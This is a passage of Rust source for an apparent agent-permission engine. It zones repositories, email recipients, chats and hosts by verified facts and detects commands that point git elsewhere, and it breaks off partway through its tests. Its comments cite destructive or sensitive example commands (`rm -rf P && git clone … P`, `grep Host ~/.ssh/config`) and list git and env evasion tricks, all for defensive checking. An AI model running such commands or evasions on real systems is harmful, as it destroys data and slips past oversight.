//! The context graph (`docs/design/decisions-v2/01-decision-engine.md` §3): whose a resource or a person is, as a
//! zone (Mine, Friends, Work, Outside), from **verified facts only**.
//!
//! [`Facts`] holds what the owner confirmed and what Reins verified from the providers (connected accounts, the GitHub
//! login and its orgs, people Reins itself sent to). Nothing here takes a fact from what an agent wrote: a request's
//! effects only name keys, and a key is looked up exactly (lowercased ASCII, never by prefix or similarity). A key
//! that isn't known is Outside, and is reported as an [`Unknown`] so that the owner can be asked about it.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};

use crate::effects::{self, Analysis, Area, Channel, CodeSource, Effect, NetMethod};
use crate::shell::ast;

/// Whose a thing is, least trusted last.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Zone {
    Mine,
    Friends,
    Work,
    Outside,
}

impl Zone {
    pub const ALL: [Self; 4] = [Self::Mine, Self::Friends, Self::Work, Self::Outside];

    #[must_use]
    pub fn label(self) -> &'static str {
        match self {
            Self::Mine => "Mine",
            Self::Friends => "Friends",
            Self::Work => "Work",
            Self::Outside => "Outside",
        }
    }
}

/// What a fact is about.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FactKind {
    /// A GitHub (or GitLab) user or organization.
    Owner,
    /// One repository, `owner/name`.
    Repo,
    /// An email domain (never a public mail provider's).
    Domain,
    /// A person: an email address, a phone number, a chat handle.
    Person,
    /// A network host.
    Host,
    /// A chat or group.
    Chat,
}

/// Domains anyone can have an address at: a zone for one of them would cover strangers.
pub const PUBLIC_MAIL_DOMAINS: &[&str] = &[
    "gmail.com",
    "googlemail.com",
    "icloud.com",
    "me.com",
    "mac.com",
    "outlook.com",
    "hotmail.com",
    "live.com",
    "msn.com",
    "yahoo.com",
    "proton.me",
    "protonmail.com",
    "pm.me",
    "aol.com",
    "gmx.com",
    "gmx.net",
    "yandex.ru",
    "mail.ru",
    "fastmail.com",
    "hey.com",
    "yahoo.co.uk",
    "hotmail.co.uk",
    "live.co.uk",
    "qq.com",
    "163.com",
    "zoho.com",
];

/// Verified facts about resources and parties. Keys are lowercase ASCII.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Facts {
    pub owners: BTreeMap<String, Zone>,
    pub repos: BTreeMap<String, Zone>,
    /// The owner's own addresses (connected accounts): Mine.
    pub own_addresses: BTreeSet<String>,
    pub domains: BTreeMap<String, Zone>,
    pub people: BTreeMap<String, Zone>,
    pub hosts: BTreeMap<String, Zone>,
    /// Chats by id: a Telegram chat's numeric id (negative for a group or channel), never its name or handle.
    pub chats: BTreeMap<String, Zone>,
    /// What a fact keyed by an id is shown as (`owner:#583231` → `dkat`, `chat:123456` → `@pal`). A label decides
    /// nothing: it is only how the owner recognises the fact. Not written when empty, so facts without labels (an
    /// org's signed policy) serialize, and hash, as before.
    #[serde(skip_serializing_if = "BTreeMap::is_empty")]
    pub labels: BTreeMap<String, String>,
    /// For this evaluation only: what GitHub says each login a request names is now (login → stable account id).
    /// Owner facts kept by id (`#<id>`) match only through it. Never stored, never hashed.
    #[serde(skip)]
    pub github_ids: BTreeMap<String, String>,
}

/// The fact key of a GitHub account by its stable id.
#[must_use]
pub fn github_owner_key(id: &str) -> String {
    format!("#{id}")
}

fn label_key(kind: FactKind, key: &str) -> String {
    let kind = match kind {
        FactKind::Owner => "owner",
        FactKind::Repo => "repo",
        FactKind::Domain => "domain",
        FactKind::Person => "person",
        FactKind::Host => "host",
        FactKind::Chat => "chat",
    };
    format!("{kind}:{key}")
}

/// The longest key kept (an email address can't be longer).
pub const MAX_KEY: usize = 254;

/// The lookup form of a key: trimmed and lowercased, `None` when empty or not ASCII (a lookalike can't match).
#[must_use]
pub fn key(raw: &str) -> Option<String> {
    let k = raw.trim().to_ascii_lowercase();
    (!k.is_empty() && k.len() <= MAX_KEY && k.is_ascii() && !k.chars().any(char::is_control)).then_some(k)
}

impl Facts {
    /// Records `zone` for `kind`/`raw`. `false` (and nothing changes) for a key that can't be a fact: empty, not ASCII,
    /// or a public mail domain.
    pub fn set(&mut self, kind: FactKind, raw: &str, zone: Zone) -> bool {
        let Some(k) = key(raw) else {
            return false;
        };
        if kind == FactKind::Domain && PUBLIC_MAIL_DOMAINS.contains(&k.as_str()) {
            return false;
        }
        self.map_mut(kind).insert(k, zone);
        true
    }

    /// Forgets a fact (and its label).
    pub fn remove(&mut self, kind: FactKind, raw: &str) {
        if let Some(k) = key(raw) {
            self.map_mut(kind).remove(&k);
            self.labels.remove(&label_key(kind, &k));
        }
    }

    /// Records `zone` for the GitHub account with the stable id `id` (digits), shown as `login`.
    pub fn set_github_owner(&mut self, id: &str, login: &str, zone: Zone) -> bool {
        if id.is_empty() || id.len() > 20 || !id.bytes().all(|b| b.is_ascii_digit()) {
            return false;
        }
        let k = github_owner_key(id);
        self.owners.insert(k.clone(), zone);
        self.set_label(FactKind::Owner, &k, login);
        true
    }

    /// Sets what the fact `kind`/`key` is shown as.
    pub fn set_label(&mut self, kind: FactKind, key: &str, label: &str) {
        let label: String = label.chars().filter(|c| !c.is_control()).take(80).collect();
        if !label.trim().is_empty() {
            self.labels.insert(label_key(kind, key), label);
        }
    }

    /// What the fact `kind`/`key` is shown as, if it has a label.
    #[must_use]
    pub fn label(&self, kind: FactKind, key: &str) -> Option<&str> {
        self.labels.get(&label_key(kind, key)).map(String::as_str)
    }

    /// Whether an owner fact kept by id is labelled `login` (the owner already gave that account a zone).
    fn labels_owner(&self, login: &str) -> bool {
        self.labels.iter().any(|(k, v)| k.starts_with("owner:#") && v.eq_ignore_ascii_case(login))
    }

    /// The zone recorded for `kind`/`raw`, if any.
    #[must_use]
    pub fn get(&self, kind: FactKind, raw: &str) -> Option<Zone> {
        let k = key(raw)?;
        self.map(kind).get(&k).copied()
    }

    fn map(&self, kind: FactKind) -> &BTreeMap<String, Zone> {
        match kind {
            FactKind::Owner => &self.owners,
            FactKind::Repo => &self.repos,
            FactKind::Domain => &self.domains,
            FactKind::Person => &self.people,
            FactKind::Host => &self.hosts,
            FactKind::Chat => &self.chats,
        }
    }

    fn map_mut(&mut self, kind: FactKind) -> &mut BTreeMap<String, Zone> {
        match kind {
            FactKind::Owner => &mut self.owners,
            FactKind::Repo => &mut self.repos,
            FactKind::Domain => &mut self.domains,
            FactKind::Person => &mut self.people,
            FactKind::Host => &mut self.hosts,
            FactKind::Chat => &mut self.chats,
        }
    }
}

/// A key a request names that the facts don't know: the owner can be asked about it.
#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub struct Unknown {
    pub kind: FactKind,
    pub key: String,
}

/// A request's zone, what it named that isn't known, and the resource it acts on.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Resolved {
    pub zone: Zone,
    pub unknown: Vec<Unknown>,
    /// The single repository (its fact key), else the recipients (sorted, joined by `,`), else the host.
    pub resource: Option<String>,
    /// Each repository, recipient or host on its own (a rule's resource must match every one to permit).
    pub parts: Vec<String>,
}

/// The host a bare `owner` or `owner/name` key means. Facts for any other host carry it: `gitlab.com/acme`.
pub const GITHUB: &str = "github.com";

/// A GitHub-style login or repository name part.
fn login(s: &str) -> bool {
    !s.is_empty() && s.len() <= 100 && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// A host name: lowercase letters, digits, dots and dashes, with a dot.
fn host_name(s: &str) -> bool {
    s.contains('.') && s.len() <= 253 && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.'))
}

/// A repository: its host, owner and name (lowercase).
#[derive(Clone, Debug, PartialEq, Eq, Hash)]
pub struct RepoRef {
    pub host: String,
    pub owner: String,
    pub name: String,
}

impl RepoRef {
    /// The owner's fact key: `owner` on GitHub, `host/owner` elsewhere.
    #[must_use]
    pub fn owner_key(&self) -> String {
        if self.host == GITHUB {
            self.owner.clone()
        } else {
            format!("{}/{}", self.host, self.owner)
        }
    }

    /// The repository's fact key: `owner/name` on GitHub, `host/owner/name` elsewhere.
    #[must_use]
    pub fn key(&self) -> String {
        format!("{}/{}", self.owner_key(), self.name)
    }
}

/// A repository named with its host: `https://host/o/n(.git)`, `ssh://git@host/o/n`, `git@host:o/n` or `host/o/n`.
/// A bare `o/n` is `bare_host`'s (a GitHub tool says `github.com`), and nothing without one: in a command a bare
/// name is a remote's name, not a repository.
#[must_use]
pub fn parse_repo(repo: &str, bare_host: Option<&str>) -> Option<RepoRef> {
    let r = repo.trim();
    // Anything a URL parser could read two ways is not a repository: a query, a fragment, an escape, a backslash.
    if r.is_empty() || r.contains(['?', '#', '%', '\\', '"', '\'', ' ', '\t', '\n']) {
        return None;
    }
    let (host, path) = if let Some((_, rest)) = r.split_once("://") {
        // The authority ends at the first `/`; at most one `@` (userinfo), then the host and maybe a port.
        let (authority, path) = rest.split_once('/')?;
        if authority.matches('@').count() > 1 {
            return None;
        }
        let host = authority.split_once('@').map_or(authority, |(_, h)| h);
        let host = match host.split_once(':') {
            Some((h, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => h,
            Some(_) => return None,
            None => host,
        };
        (host.to_ascii_lowercase(), path)
    } else if let Some((user_host, path)) = r.split_once(':') {
        // `user@host:owner/name`: exactly one `@`, nothing else before the `:`.
        if user_host.matches('@').count() != 1 || path.contains(':') || path.contains('@') {
            return None;
        }
        let (_, host) = user_host.split_once('@')?;
        (host.to_ascii_lowercase(), path)
    } else {
        if r.contains('@') {
            return None;
        }
        let mut parts = r.splitn(3, '/');
        match (parts.next(), parts.next(), parts.next()) {
            (Some(h), Some(_), Some(_)) if h.contains('.') => {
                (h.to_ascii_lowercase(), r.split_once('/').map_or("", |(_, p)| p))
            }
            (Some(_), Some(_), None) => (bare_host?.to_ascii_lowercase(), r),
            _ => return None,
        }
    };
    if !host_name(&host) || host.starts_with(['.', '-']) || host.ends_with('.') {
        return None;
    }
    let path = path.trim_end_matches('/');
    let path = path.strip_suffix(".git").unwrap_or(path);
    let (o, n) = path.split_once('/')?;
    (login(o) && login(n)).then(|| RepoRef {
        host,
        owner: o.to_ascii_lowercase(),
        name: n.to_ascii_lowercase(),
    })
}

/// The zone of a repository: its own fact, else its owner's (on the same host); unknown owners are Outside.
#[must_use]
pub fn repo_zone(facts: &Facts, repo: &RepoRef) -> (Zone, Option<Unknown>) {
    if let Some(z) = facts.repos.get(&repo.key()) {
        return (*z, None);
    }
    let owner = repo.owner_key();
    // A GitHub account the owner zoned by its stable id: only when GitHub says the login is that account now.
    if repo.host == GITHUB
        && let Some(id) = facts.github_ids.get(&repo.owner)
        && let Some(z) = facts.owners.get(&github_owner_key(id))
    {
        return (*z, None);
    }
    match facts.owners.get(&owner) {
        Some(z) => (*z, None),
        // Named by the facts (by id), but not resolved now: Outside, without asking again.
        None if repo.host == GITHUB && !facts.github_ids.contains_key(&repo.owner) && facts.labels_owner(&owner) => {
            (Zone::Outside, None)
        }
        None => (
            Zone::Outside,
            Some(Unknown {
                kind: FactKind::Owner,
                key: owner,
            }),
        ),
    }
}

/// An email address's domain, when it is plainly one address: exactly one `@`, and no quotes, `%`, `<>`, `!`,
/// whitespace or commas anywhere (each can route mail elsewhere or hide a second address). Anything else has no
/// domain, so no domain fact covers it.
fn address_domain(addr: &str) -> Option<&str> {
    if addr.chars().any(|c| c.is_whitespace() || matches!(c, '"' | '%' | '<' | '>' | ',' | '!' | '\'' | '\\')) {
        return None;
    }
    let (local, domain) = addr.split_once('@')?;
    (!local.is_empty() && !domain.contains('@') && domain.contains('.') && host_name(domain)).then_some(domain)
}

/// The addresses in one recipient field: a list split on `,` and `;`, each a plain address or `Name <address>`
/// (one pair of angle brackets, at the end, a name with no `@`, quotes or brackets). `None` when any part isn't a
/// well-formed mailbox: then the field is Outside.
#[must_use]
pub fn mailboxes(field: &str) -> Option<Vec<String>> {
    let mut out = Vec::new();
    for part in field.split([',', ';']) {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        let addr = match part.find('<') {
            Some(open) => {
                let name = &part[..open];
                let inner = part[open + 1..].strip_suffix('>')?;
                if name.contains(['@', '"', '<', '>']) || inner.contains(['<', '>']) {
                    return None;
                }
                inner.trim()
            }
            None if part.contains('>') => return None,
            None => part,
        };
        let addr = key(addr)?;
        address_domain(&addr)?;
        out.push(addr);
    }
    (!out.is_empty()).then_some(out)
}

/// A chat party a fact can be kept for: a numeric id, an `@username` or a `+number`. A chat's display name isn't:
/// names aren't unique and anyone can take one.
fn chat_id(s: &str) -> bool {
    let digits = |t: &str| !t.is_empty() && t.len() <= 20 && t.chars().all(|c| c.is_ascii_digit());
    match s.as_bytes().first() {
        Some(b'@') => s.len() > 1 && s.len() <= 33 && s[1..].chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
        Some(b'+' | b'-') => digits(&s[1..]),
        _ => digits(s),
    }
}

/// A Telegram chat's id: digits, negative for a group or a channel.
fn telegram_id(s: &str) -> bool {
    let digits = s.strip_prefix('-').unwrap_or(s);
    !digits.is_empty() && digits.len() <= 20 && digits.bytes().all(|b| b.is_ascii_digit())
}

/// The zone of one party a message reaches.
#[must_use]
pub fn party_zone(facts: &Facts, channel: &Channel, party: &str) -> (Zone, Option<Unknown>) {
    let unknown = |kind: FactKind, k: Option<String>| {
        (
            Zone::Outside,
            k.map(|key| Unknown {
                kind,
                key,
            }),
        )
    };
    match channel {
        // One mailbox, as [`mailboxes`] splits a field (anything else is Outside).
        Channel::Email | Channel::Calendar => {
            let Some(addr) = mailboxes(party).filter(|m| m.len() == 1).and_then(|m| m.into_iter().next()) else {
                return (Zone::Outside, None);
            };
            if facts.own_addresses.contains(&addr) {
                return (Zone::Mine, None);
            }
            if let Some(z) = facts.people.get(&addr) {
                return (*z, None);
            }
            match address_domain(&addr) {
                Some(d) => match facts.domains.get(d) {
                    Some(z) if !PUBLIC_MAIL_DOMAINS.contains(&d) => (*z, None),
                    _ => unknown(FactKind::Person, Some(addr.clone())),
                },
                None => unknown(FactKind::Person, None),
            }
        }
        // Telegram: by the chat's numeric id only. The phone resolves what an agent wrote (a handle, a name) to the id
        // of the chat a send would reach, and knows the owner's own chat (Saved Messages) by the account's id; anything
        // still unresolved is Outside, and isn't a question.
        Channel::Telegram => {
            let Some(k) = key(party).filter(|k| telegram_id(k)) else {
                return (Zone::Outside, None);
            };
            if let Some(z) = facts.chats.get(&k).or_else(|| facts.people.get(&k)) {
                return (*z, None);
            }
            unknown(FactKind::Chat, Some(k))
        }
        // Texts: by number.
        Channel::Sms => {
            let Some(k) = key(party).filter(|k| chat_id(k)) else {
                return (Zone::Outside, None);
            };
            if let Some(z) = facts.chats.get(&k).or_else(|| facts.people.get(&k)) {
                return (*z, None);
            }
            unknown(FactKind::Chat, Some(k))
        }
        Channel::GitHub => match parse_repo(party, Some(GITHUB)) {
            Some(r) => repo_zone(facts, &r),
            None => (Zone::Outside, None),
        },
        Channel::Other(_) => (Zone::Outside, None),
    }
}

/// The zone of a network host: this computer and the owner's own hosts by fact.
#[must_use]
pub fn host_zone(facts: &Facts, host: &str) -> (Zone, Option<Unknown>) {
    if effects::local_host(host) {
        return (Zone::Mine, None);
    }
    let Some(k) = key(host) else {
        return (Zone::Outside, None);
    };
    match facts.hosts.get(&k) {
        Some(z) => (*z, None),
        None => (
            Zone::Outside,
            login(&k).then_some(Unknown {
                kind: FactKind::Host,
                key: k,
            }),
        ),
    }
}

/// Which repository a command's `origin` and "this repository" are.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum RepoAt {
    /// The one `cwd` is in.
    Cwd,
    /// The one in this folder: the command starts with `cd <folder>` (a literal path) and moves nowhere else.
    Dir(String),
    /// Not known: `git -C`, `--git-dir`, `--work-tree`, `GIT_DIR=`, `GIT_WORK_TREE=`, a `cd` later in the command or
    /// to a target that can't be read. What goes to `origin` is then Outside.
    Unknown,
}

/// A word as written when it is literal but for a leading `~`.
/// Only an unquoted `~` is the home folder: a quoted or escaped one (`'~/x'`, `\~/x`) is a folder named `~`, which
/// this never names.
fn tilde_literal(w: &ast::Word) -> Option<String> {
    match w.0.split_first() {
        Some((ast::Part::Tilde(None), rest)) => ast::Word(rest.to_vec()).literal().map(|r| format!("~{r}")),
        _ => w.literal().filter(|t| !t.starts_with('~')),
    }
}

/// The folder a simple command `git worktree add [options] <folder> [<commit>]` adds, as written (literal, absolute or
/// under `~`), for the options git has. `None` for anything else.
fn worktree_add(c: &ast::Command) -> Option<String> {
    let ast::Command::Simple(s) = c else {
        return None;
    };
    if !s.assigns.is_empty() {
        return None;
    }
    let words: Vec<String> = s.words.iter().map(tilde_literal).collect::<Option<_>>()?;
    let rest = match words.iter().map(String::as_str).collect::<Vec<_>>().as_slice() {
        ["git", "worktree", "add", rest @ ..] => rest.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>(),
        _ => return None,
    };
    let mut positional = Vec::new();
    let mut k = 0;
    let mut options = true;
    while let Some(w) = rest.get(k) {
        match w.as_str() {
            "--" if options => options = false,
            "-f"
            | "--force"
            | "-d"
            | "--detach"
            | "--checkout"
            | "--no-checkout"
            | "--lock"
            | "-q"
            | "--quiet"
            | "--track"
            | "--no-track"
            | "--guess-remote"
            | "--no-guess-remote"
            | "--orphan"
            | "--relative-paths"
            | "--no-relative-paths"
                if options => {}
            "-b" | "-B" | "--reason" if options => k += 1,
            o if options && o.starts_with("--reason=") => {}
            o if options && o.starts_with('-') => return None,
            o => positional.push(o.to_owned()),
        }
        k += 1;
    }
    match positional.as_slice() {
        [dir] | [dir, _] if dir.starts_with('/') || dir.starts_with('~') => Some(dir.clone()),
        _ => None,
    }
}

/// How many times `command` moves to `target` (absolute) right after adding it as a worktree: at the top level, a
/// `git worktree add <target>` joined to a later `cd <target>` by `&&` only, so the `cd` runs only when git made the
/// worktree (git fails on a folder that exists). There, the command is still in the repository it runs in.
fn fresh_worktree_cds(command: &str, cwd: &str, home: &str, target: &str) -> usize {
    let parsed = ast::parse(command);
    if !parsed.complete {
        return 0;
    }
    let is_cd = |q: &ast::Pipeline| {
        matches!(q.commands.as_slice(), [ast::Command::Simple(s)]
            if s.assigns.is_empty()
                && s.words.len() == 2
                && s.words[0].literal().as_deref() == Some("cd")
                && tilde_literal(&s.words[1])
                    .is_some_and(|t| (t.starts_with('/') || t.starts_with('~'))
                        && effects::normalize(&t, cwd, home) == target))
    };
    let mut count = 0;
    for ao in &parsed.script.0 {
        // The first add of `target` in the list; every `cd` after it joined by `&&` only.
        let added = ao.pipelines.iter().position(|p| {
            !p.negated
                && matches!(p.commands.as_slice(), [add] if worktree_add(add)
                    .is_some_and(|d| effects::normalize(&d, cwd, home) == target))
        });
        // Only `&&` before the add too: after `a || add`, what follows runs when `a` succeeded and git never ran.
        // The `cd` right after it: anything between could make the folder again (`rm -rf P && git clone … P`).
        if let Some(k) = added
            && ao.pipelines.get(k + 1).is_some_and(is_cd)
            && ao.ors[..=k].iter().all(|or| !or)
        {
            count += 1;
        }
    }
    count
}

/// Where `command`, run in `cwd` (in the repository at `top`), acts.
#[must_use]
pub fn repo_at(command: &str, cwd: &str, top: Option<&str>, home: &str) -> RepoAt {
    repo_at_in(command, cwd, top, home, &|p: &str| Some(p.to_owned()))
}

/// [`repo_at`] on a computer: `real` gives a folder's real path (symlinks resolved; `None` when it can't), so a `cd`
/// into a symlink inside the repository that leads out of it is not taken for the repository.
#[must_use]
#[allow(clippy::too_many_lines, reason = "one arm per way a command can move or point git elsewhere")]
pub fn repo_at_in(
    command: &str,
    cwd: &str,
    top: Option<&str>,
    home: &str,
    real: &dyn Fn(&str) -> Option<String>,
) -> RepoAt {
    // Words, with each command separator as a word of its own (`;`).
    let spaced: String = command
        .chars()
        .map(|c| {
            if matches!(c, ';' | '&' | '|' | '(' | ')' | '{' | '}' | '\n') {
                ';'
            } else {
                c
            }
        })
        .collect::<String>()
        .replace(';', " ; ");
    // A quoted `~` is no home folder: such a word is not read (`\` makes it not literal).
    let tokens: Vec<String> = spaced
        .split_whitespace()
        .map(|t| {
            let bare = t.trim_matches(|c| c == '"' || c == '\'');
            if bare.starts_with('~') && !t.starts_with('~') {
                format!("\\{bare}")
            } else {
                bare.to_owned()
            }
        })
        .collect();
    let literal = |t: &str| t != ";" && !t.starts_with('-') && !t.contains(['$', '`', '*', '?', '\\']);
    let under = |abs: &str, t: &str| {
        let t = t.trim_end_matches('/');
        abs == t || abs.starts_with(&format!("{t}/"))
    };
    // Inside the repository as written, and where it really is (a symlink in it may lead out).
    let inside = |abs: &str| {
        top.is_some_and(|t| under(abs, t)) && top.and_then(real).zip(real(abs)).is_some_and(|(t, r)| under(&r, &t))
    };
    let absolute = |t: &str| t.starts_with('/') || t.starts_with('~');
    let mut at = RepoAt::Cwd;
    let mut here = cwd.to_owned();
    let mut in_git = false;
    let mut in_env = false;
    for (i, t) in tokens.iter().enumerate() {
        // Where the repository is, or what its configuration says (`remote.origin.url`, an `insteadOf` in the global
        // configuration a `HOME` names), or where a relative `cd` goes, set on the line.
        if ["GIT_DIR=", "GIT_WORK_TREE=", "GIT_CONFIG", "GIT_COMMON_DIR=", "HOME=", "XDG_CONFIG_HOME=", "CDPATH="]
            .iter()
            .any(|v| t.starts_with(v))
        {
            return RepoAt::Unknown;
        }
        match t.as_str() {
            // Back to a folder the words don't name.
            "popd" => return RepoAt::Unknown,
            "cd" | "pushd" => {
                let target = match tokens.get(i + 1) {
                    Some(target) if literal(target) => effects::normalize(target, &here, home),
                    _ => return RepoAt::Unknown,
                };
                // zsh's `cd old new` replaces text in the folder's path.
                if tokens.get(i + 2).is_some_and(|n| n != ";" && !n.contains(['>', '<'])) {
                    return RepoAt::Unknown;
                }
                if inside(&target) {
                    // Back in the repository `cwd` is in after a leading `cd` elsewhere: two repositories.
                    if at != RepoAt::Cwd {
                        return RepoAt::Unknown;
                    }
                    here = target;
                    continue;
                }
                if top.is_some_and(|t| under(&target, t)) {
                    // Inside as written, but not where it really is.
                    return RepoAt::Unknown;
                }
                // A worktree the command just added is the same repository, when every move there (as the words
                // read, a relative one counting as one) is one that runs only once git added it.
                let moves = tokens
                    .windows(2)
                    .filter(|w| {
                        matches!(w[0].as_str(), "cd" | "pushd")
                            && (!absolute(&w[1]) || effects::normalize(&w[1], cwd, home) == target)
                    })
                    .count();
                if moves > 0 && fresh_worktree_cds(command, cwd, home, &target) == moves {
                    here = target;
                    continue;
                }
                // Only a leading `cd` says where everything after it runs.
                if i == 0 && at == RepoAt::Cwd {
                    here.clone_from(&target);
                    at = RepoAt::Dir(target);
                } else {
                    return RepoAt::Unknown;
                }
            }
            "git" => in_git = true,
            "env" => in_env = true,
            ";" => {
                in_git = false;
                in_env = false;
            }
            // `env -C DIR`, `env --chdir=DIR`: the program runs elsewhere.
            _ if in_env
                && (t.starts_with("--ch") || (t.starts_with('-') && !t.starts_with("--") && t.contains('C'))) =>
            {
                return RepoAt::Unknown;
            }
            "-C" | "-c" | "--git-dir" | "--work-tree" | "--config-env" if in_git => return RepoAt::Unknown,
            _ if in_git
                && (t.starts_with("--git-dir=")
                    || t.starts_with("--work-tree=")
                    || t.starts_with("--config-env=")
                    || (t.starts_with("-c") && t.len() > 2)) =>
            {
                return RepoAt::Unknown;
            }
            _ if !t.starts_with('-') => {
                in_git = false;
                if !t.contains('=') {
                    in_env = false;
                }
            }
            _ => {}
        }
    }
    at
}

/// What a request acts on beyond what its effects name.
#[derive(Clone, Copy, Debug, Default)]
pub struct Base<'a> {
    /// The repository the request runs in or names as its own: what a push to `origin` (or with no remote), a local
    /// ref and "this repository" mean. `None`: not known, so those are Outside.
    pub repo: Option<&'a str>,
    /// Other remotes by name → URL, read strictly from the repository's configuration. A name not here is Outside.
    pub remotes: Option<&'a BTreeMap<String, String>>,
    /// The host a bare `owner/name` means (a GitHub tool: [`GITHUB`]). `None`: a bare name is a remote's name.
    pub bare_host: Option<&'a str>,
}

/// A request's zone: the least trusted zone of everything it changes or reaches (01 §3). Reads add no zone (01 §3 would
/// make every read outside the workspace Outside, so `grep Host ~/.ssh/config` would ask at L0; a read's risk is its
/// level and the always-ask floor). With nothing that sets a zone, it is the base repository's, else Mine.
#[must_use]
pub fn request_zone(a: &Analysis, facts: &Facts, base: &Base<'_>) -> Resolved {
    let mut zone: Option<Zone> = None;
    let mut unknown: Vec<Unknown> = Vec::new();
    let mut repos: BTreeSet<String> = BTreeSet::new();
    let mut parties: BTreeSet<String> = BTreeSet::new();
    let mut hosts: BTreeSet<String> = BTreeSet::new();
    let mut add = |z: Zone, u: Option<Unknown>| {
        zone = Some(zone.map_or(z, |cur| cur.max(z)));
        if let Some(u) = u
            && !unknown.contains(&u)
        {
            unknown.push(u);
        }
    };
    let base_ref = base.repo.and_then(|b| parse_repo(b, base.bare_host));
    let base_zone = || base_ref.as_ref().map_or((Zone::Outside, None), |r| repo_zone(facts, r));
    // A repository as a push or a ref change names it.
    let pushed = |repo: &str, repos: &mut BTreeSet<String>| -> (Zone, Option<Unknown>) {
        let r = repo.trim();
        if r.is_empty() {
            // A local ref (`git branch -D`, `git stash drop`): nothing leaves this computer, and its level says how
            // recoverable it is.
            return (Zone::Mine, None);
        }
        let found = if r == "origin" {
            base_ref.clone()
        } else if let Some(p) = parse_repo(r, base.bare_host) {
            Some(p)
        } else {
            // Another remote: what its configuration says, else not known.
            base.remotes.and_then(|m| m.get(r)).and_then(|url| parse_repo(url, None))
        };
        match found {
            Some(p) => {
                repos.insert(p.key());
                repo_zone(facts, &p)
            }
            None => (Zone::Outside, None),
        }
    };
    let area = |area: &Area| match area {
        // A path worked out only at run time is assumed in the workspace's zone (01 §2.4); its level is already the
        // worst plausible one and its certainty Partial or None, which the model or the floor weighs.
        Area::Generated | Area::Scratch | Area::Source | Area::Unknown => (Zone::Mine, None),
        Area::Home | Area::System => (Zone::Outside, None),
        Area::Remote(h) => host_zone(facts, h),
    };
    for e in &a.effects {
        match e {
            Effect::FileWrite {
                path,
            } => {
                let (z, u) = area(&path.area);
                add(z, u);
            }
            Effect::FileDelete {
                paths,
                ..
            } => {
                for p in paths {
                    let (z, u) = area(&p.area);
                    add(z, u);
                }
                if paths.is_empty() {
                    add(Zone::Outside, None);
                }
            }
            Effect::GitPush {
                repo,
                ..
            }
            | Effect::GitRefDelete {
                repo,
                ..
            } => {
                let (z, u) = pushed(repo, &mut repos);
                add(z, u);
            }
            Effect::Message {
                channel,
                to,
                ..
            } => {
                if to.is_empty() {
                    add(Zone::Outside, None);
                }
                for p in to {
                    if matches!(channel, Channel::Email | Channel::Calendar) {
                        // Each mailbox of the field on its own; a field that doesn't parse is Outside.
                        if let Some(list) = mailboxes(p) {
                            for addr in list {
                                let (z, u) = party_zone(facts, channel, &addr);
                                parties.insert(addr);
                                add(z, u);
                            }
                        } else {
                            parties.insert(p.trim().to_ascii_lowercase());
                            add(Zone::Outside, None);
                        }
                        continue;
                    }
                    let (z, u) = if *channel != Channel::GitHub {
                        parties.insert(p.trim().to_ascii_lowercase());
                        party_zone(facts, channel, p)
                    } else if let Some(r) = parse_repo(p, Some(GITHUB)) {
                        repos.insert(r.key());
                        repo_zone(facts, &r)
                    } else {
                        // "this repository": the one the request acts on, else Outside.
                        if let Some(b) = &base_ref {
                            repos.insert(b.key());
                        }
                        base_zone()
                    };
                    add(z, u);
                }
            }
            Effect::Network {
                host,
                method: NetMethod::Write | NetMethod::Connect | NetMethod::UploadExecutable,
            } => {
                hosts.insert(host.to_ascii_lowercase());
                let (z, u) = host_zone(facts, host);
                add(z, u);
            }
            Effect::Infra {
                local: false,
                ..
            }
            | Effect::Exec {
                source: CodeSource::Downloaded,
                ..
            }
            | Effect::Publish {
                ..
            }
            | Effect::SecretOut {
                ..
            } => add(Zone::Outside, None),
            Effect::Permission {
                resource,
                ..
            } => {
                let (z, u) =
                    parse_repo(resource, base.bare_host).map_or((Zone::Outside, None), |r| repo_zone(facts, &r));
                add(z, u);
            }
            Effect::FileRead {
                ..
            }
            | Effect::Network {
                ..
            }
            | Effect::Infra {
                ..
            }
            | Effect::Exec {
                ..
            }
            | Effect::DataRead {
                ..
            }
            | Effect::DataWrite {
                ..
            }
            | Effect::SecretUse {
                ..
            }
            | Effect::Money {
                ..
            }
            | Effect::Unknown {
                ..
            } => {}
        }
    }
    let zone = zone.unwrap_or_else(|| match base.repo {
        Some(_) => {
            let (z, u) = base_zone();
            if let Some(u) = u
                && !unknown.contains(&u)
            {
                unknown.push(u);
            }
            z
        }
        None => Zone::Mine,
    });
    let parts: Vec<String> = if repos.is_empty() && parties.is_empty() {
        hosts.iter().cloned().collect()
    } else {
        repos.iter().chain(&parties).cloned().collect()
    };
    let resource = if repos.len() == 1 && parties.is_empty() {
        repos.into_iter().next()
    } else if !parties.is_empty() && repos.is_empty() {
        Some(parties.into_iter().collect::<Vec<_>>().join(","))
    } else if hosts.len() == 1 && repos.is_empty() && parties.is_empty() {
        hosts.into_iter().next()
    } else {
        None
    };
    Resolved {
        zone,
        unknown,
        resource,
        parts,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::effects::{Context, Workspace, analyze_command, analyze_tool};
    use serde_json::json;

    fn facts() -> Facts {
        let mut f = Facts::default();
        f.set(FactKind::Owner, "dkat", Zone::Mine);
        f.set(FactKind::Owner, "acme", Zone::Work);
        f.set(FactKind::Repo, "octo/x", Zone::Friends);
        f.set(FactKind::Domain, "acme.io", Zone::Work);
        f.set(FactKind::Person, "ann@example.com", Zone::Friends);
        f.own_addresses.insert("me@gmail.com".to_owned());
        f
    }

    fn base(repo: &str) -> Base<'_> {
        Base {
